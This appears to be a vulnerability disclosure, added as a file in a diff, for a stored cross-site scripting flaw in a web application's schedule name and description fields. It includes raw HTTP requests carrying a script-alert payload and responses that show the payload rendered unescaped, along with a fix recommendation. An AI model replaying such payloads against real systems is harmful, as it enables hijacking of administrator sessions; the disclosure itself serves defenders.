@@ -1,0 +1,92 @@
+An authenticated malicious actor can insert a malicious XSS payload in the "description" and "name" inputs during the creation of a new schedule. The malicious payload can be executed when the endpoint "/settings/schedule/start" is requested. This also affects the "http://domain/state/audittrail" endpoint. This would result in privilege escalation or unauthorized actions execution in the context of the privileges user (e.g. admin).
+
+User Input Sanitization should be implemented for fixing this issue.
+
+
+Below, evidence is provided.
+
+
+Request 1:
+POST /settings/schedule/new HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 187
+Origin: http://1.1.1.1
+DNT: 1
+Connection: close
+Referer: http://1.1.1.1/settings/schedule/new
+Cookie: ksp=1514611162374576796
+Upgrade-Insecure-Requests: 1
+
+ksp_formID=form1&ksp_requestID=1&name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&description=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&form_hd1=null&ksp_redirect=%2Fsettings%2Fschedule%2Fsave
+
+
+Response 1:
+HTTP/1.1 302 Found
+Location: /settings/schedule/save
+Content-type: text/html
+Content-Length: 275
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>Redirect</title></head>
+<body>
+<h1>Redirect</h1>
+<p>Redirect to:/settings/schedule/save</p>
+</body>
+</html>
+
+
+
+
+
+Request 2:
+GET /settings/schedule/save HTTP/1.1
+Host: 80.28.218.49
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://80.28.218.49/settings/schedule/new
+DNT: 1
+Connection: close
+Cookie: ksp=7514611162374576796
+Upgrade-Insecure-Requests: 1
+
+
+
+
+
+Response 2:
+HTTP/1.0 200 OK
+Connection: close
+Content-Type: text/html
+Cache-Control: no-cache
+Pragma: no-cache
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"> 
+
+.......code.......
+.......code.......
+
+<form action="" method="post" id="newCalendar" class="form width_100"><div><input type="hidden" name="ksp_formID" value="form1" /><input type="hidden" name="ksp_requestID" value="30" /></div>
+<label>Schedule name:</label>
+<script>alert(1)</script>
+<br/>
+<label>Description:</label>
+<script>alert(1)</script>
+<br/>
+<div class="buttonpane">
+<input type="hidden" name="ksp_redirect" value="/settings/schedule/start" /><input type="submit" value="OK" alt="Set" class="ui-button ui-widget ui-state-default ui-corner-all" />
+</div>
+</form>
+
+.......code.......
+.......code.......
+
+</html>
